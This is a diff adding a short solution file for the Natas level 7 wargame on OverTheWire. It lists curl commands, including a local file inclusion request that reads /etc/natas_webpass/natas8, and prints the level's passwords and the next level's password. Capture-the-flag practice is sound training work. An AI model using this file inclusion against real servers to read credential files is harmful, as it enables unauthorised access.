@@ -1,0 +1,26 @@
+
+*** Natas Level 7 ***
+
+GOAL:
+-----
+1)  Username: natas7
+    URL:      http://natas7.natas.labs.overthewire.org
+
+
+HINTS:
+------
+
+HELP:
+-----
+
+SOLUTIONS:
+----------
+1)  $ curl -vu natas7 http://natas7.natas.labs.overthewire.org/
+2)  $ 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+3)  $ curl -su natas7 http://natas7.natas.labs.overthewire.org/
+                      index.php?page=/etc/natas_webpass/natas8 | html2text
+4)  $ 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+
